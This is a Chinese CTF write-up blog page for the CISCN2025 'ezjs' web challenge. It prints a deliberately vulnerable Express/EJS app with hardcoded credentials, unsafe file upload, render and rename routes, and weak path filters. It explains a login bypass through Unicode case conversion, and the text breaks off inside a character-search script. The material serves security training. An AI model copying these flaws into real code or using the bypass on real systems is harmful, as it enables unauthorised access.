<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CISCN2025-Web突击 | cheng_xing's blog</title><meta name="robots" content="noindex"><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ezjs1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011">
<meta property="og:type" content="article">
<meta property="og:title" content="CISCN2025-Web突击">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="ezjs1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-07-16T16:40:09.000Z">
<meta property="article:modified_time" content="2025-07-23T16:27:38.436Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="ssti">
<meta property="article:tag" content="pickle反序列化">
<meta property="article:tag" content="django">
<meta property="article:tag" content="python格式化字符串漏洞">
<meta property="article:tag" content="RS256弱公钥jwt伪造">
<meta property="article:tag" content="nodejs弱比较">
<meta property="article:tag" content="java">
<meta property="article:tag" content="Beetl模板注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CISCN2025-Web突击",
  "url": "https://sakuraraindrop.github.io/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-07-16T16:40:09.000Z",
  "dateModified": "2025-07-23T16:27:38.436Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CISCN2025-Web突击',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">118</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">CISCN2025-Web突击</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CISCN2025-Web突击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-16T16:40:09.000Z" title="发表于 2025-07-17 00:40:09">2025-07-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-23T16:27:38.436Z" title="更新于 2025-07-24 00:27:38">2025-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%A4%87%E8%B5%9B/">web备赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createDirectoriesForFilePath</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> dirname = path.<span class="title function_">dirname</span>(filePath);</span><br><span class="line"></span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(dirname, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">    <span class="attr">destination</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)); <span class="comment">// 设置上传文件的目标目录</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">filename</span>: <span class="keyword">function</span> (<span class="params">req, file, cb</span>) &#123;</span><br><span class="line">        <span class="comment">// 直接使用原始文件名</span></span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置 multer 上传中间件</span></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123;</span><br><span class="line">    <span class="attr">storage</span>: storage, <span class="comment">// 使用自定义存储选项</span></span><br><span class="line">    <span class="attr">fileFilter</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">        <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果文件后缀为 .ejs，则拒绝上传该文件</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>); <span class="comment">// 允许上传其他类型的文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">admin=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;ADMIN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;Can_U_hack_me?&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;you can not be admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_username = username.<span class="title function_">toUpperCase</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (new_username === admin.<span class="property">username</span> &amp;&amp; password === admin.<span class="property">password</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;ADMIN&quot;</span>;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/rename&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// res.redirect(&#x27;/login&#x27;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;upload&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, upload.<span class="title function_">single</span>(<span class="string">&#x27;fileInput&#x27;</span>), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No file uploaded&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> fileExt = path.<span class="title function_">extname</span>(req.<span class="property">file</span>.<span class="property">originalname</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fileExt === <span class="string">&#x27;.ejs&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Upload of .ejs files is not allowed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;File uploaded successfully: &#x27;</span> + req.<span class="property">file</span>.<span class="property">originalname</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/render&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; filename &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filename) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Filename parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(filePath);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/rename&#x27;</span>,<span class="title class_">IfLogin</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> !== <span class="string">&#x27;ADMIN&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Access forbidden&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; oldPath , newPath &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath || !newPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing oldPath or newPath&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newPath &amp;&amp; <span class="regexp">/app\.js|\\|\.ejs/i</span>.<span class="title function_">test</span>(newPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldPath &amp;&amp; <span class="regexp">/\.\.|flag/i</span>.<span class="title function_">test</span>(oldPath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> new_file = newPath.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> oldFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldPath);</span><br><span class="line">    <span class="keyword">const</span> newFilePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, new_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (newFilePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.ejs&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!oldPath) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;oldPath parameter is required&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(oldFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Old file not found&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(newFilePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">409</span>).<span class="title function_">send</span>(<span class="string">&#x27;New file path already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createDirectoriesForFilePath</span>(newFilePath)</span><br><span class="line">    fs.<span class="title function_">rename</span>(oldFilePath, newFilePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error renaming file:&#x27;</span>, err);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error renaming file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;File renamed successfully&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;3000&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`http://localhost:3000`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>登录存在绕过，用nodejs的大小写转化的特性绕过就可以了。<br>toUpperCase()：ı&#x3D;&#x3D;&gt;I，ſ&#x3D;&#x3D;&gt;S。<br>toLowerCase()：İ&#x3D;&#x3D;&gt;i，K&#x3D;&#x3D;&gt;k。<br><img src="/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/2.png" alt="alt text"></p>
<p>顺便再给一个chatgpt给的验证脚本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定特定字符</span></span><br><span class="line"><span class="keyword">const</span> targetCharacter = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：遍历并处理Unicode字符</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findCharactersConvertingToTarget</span>(<span class="params">targetChar</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> results = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> codePoint = <span class="number">0</span>; codePoint &lt;= <span class="number">0x10FFFF</span>; codePoint++) &#123;</span><br><span class="line">        <span class="comment">// 跳过代理对</span></span><br><span class="line">        <span class="keyword">if</span> (codePoint &gt;= <span class="number">0xD800</span> &amp;&amp; codePoint &lt;= <span class="number">0xDFFF</span>) <span class="keyword">continue</span>;</span><br><span 